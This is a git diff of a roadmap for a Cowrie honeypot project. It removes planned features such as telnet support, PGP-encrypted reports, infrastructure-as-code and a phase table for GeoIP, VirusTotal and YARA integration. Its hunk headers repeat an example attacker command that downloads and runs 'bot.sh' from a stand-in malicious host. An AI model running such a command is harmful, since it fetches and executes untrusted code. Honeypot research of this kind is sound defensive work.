@@ -50,7 +50,6 @@ The first milestone combines daily reporting with essential threat intelligence 
 - [x] `msmtp` or `sendmail` for direct SMTP
 - [x] Integration with SendGrid/Mailgun API for reliability
 - [x] HTML email with inline styling (no external dependencies)
-- [ ] Optional PGP encryption for sensitive reports (future enhancement)
 - [x] Cron job: `0 6 * * * /opt/cowrie/scripts/daily-report.py`
 
 ### Master Configuration System
@@ -158,11 +157,6 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Fake user home directories with files
 - [ ] Web honeypot on port 80/443 (nginx with fake admin panels)
 
-### Telnet Support
-- [ ] Enable Cowrie telnet listener
-- [ ] Configure on port 23
-- [ ] Realistic telnet banner
-
 ### Multiple Honeypot Deployment
 - [ ] Deploy fleet across multiple Hetzner locations
 - [ ] Centralized log collection
@@ -181,18 +175,6 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Integration with MISP
 - [ ] Contribute to community threat feeds
 
-## Future: Infrastructure
-
-### Terraform/Pulumi
-- [ ] Infrastructure as Code for Hetzner deployment
-- [ ] Multi-region deployment
-- [ ] Auto-scaling based on attack volume
-
-### Kubernetes
-- [ ] Helm chart for Cowrie deployment
-- [ ] Horizontal pod autoscaling
-- [ ] Centralized logging with Fluentd
-
 ## Future: Security Hardening
 
 ### Network Segmentation
@@ -206,21 +188,3 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Automatic restart on failure
 - [ ] Uptime monitoring (e.g., UptimeRobot, Healthchecks.io)
 
----
-
-## Implementation Priority
-
-| Phase | Description | Dependencies |
-|-------|-------------|--------------|
-| **Phase 1** | Daily Email Reports + GeoIP + VirusTotal + YARA | MaxMind account, VT API key |
-| **Phase 2** | Dashboard (Grafana + Loki recommended) | Phase 1 complete |
-| **Phase 3** | Log management + Extended threat intel | Phase 2 complete |
-| Future | Honeypot enhancements, multi-site, IaC | As needed |
-
-### Phase 1 Requirements
-- **MaxMind GeoLite2**: Free account at https://www.maxmind.com/en/geolite2/signup
-- **VirusTotal API**: Free tier (4 requests/minute) at https://www.virustotal.com/
-- **YARA**: Install via `apt install yara` or use Python `yara-python` package
-- **YARA Rules**:
-  - https://github.com/Yara-Rules/rules (community rules)
-  - https://github.com/Neo23x0/signature-base (Florian Roth's rules)
